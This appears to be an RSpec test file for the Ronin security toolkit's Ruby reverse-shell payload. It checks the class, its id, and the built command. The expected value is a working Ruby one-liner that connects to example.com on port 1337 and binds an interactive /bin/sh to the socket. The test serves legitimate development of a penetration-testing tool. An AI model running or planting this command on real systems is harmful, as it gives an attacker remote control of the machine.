require 'spec_helper'
require 'ronin/payloads/builtin/command/ruby/reverse_shell'

describe Ronin::Payloads::Command::Ruby::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'command/ruby/reverse_shell'" do
      expect(subject.id).to eq('command/ruby/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `ruby` command that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{ruby -rsocket -e'f=TCPSocket.open(#{host.dump},#{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'}
      )
    end
  end
end
